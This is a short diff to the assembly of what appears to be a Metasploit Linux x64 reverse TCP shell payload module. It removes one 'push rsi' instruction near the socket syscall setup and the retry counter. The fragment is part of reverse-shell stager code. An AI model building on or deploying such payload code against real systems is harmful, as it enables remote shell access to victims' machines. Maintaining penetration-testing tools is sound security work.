@@ -112,7 +112,6 @@ module Payload::Linux::ReverseTcp_x64
 
         push   #{retry_count}        ; retry counter
         pop    r9
-        push   rsi
         push   rax
         push   0x29
         pop    rax
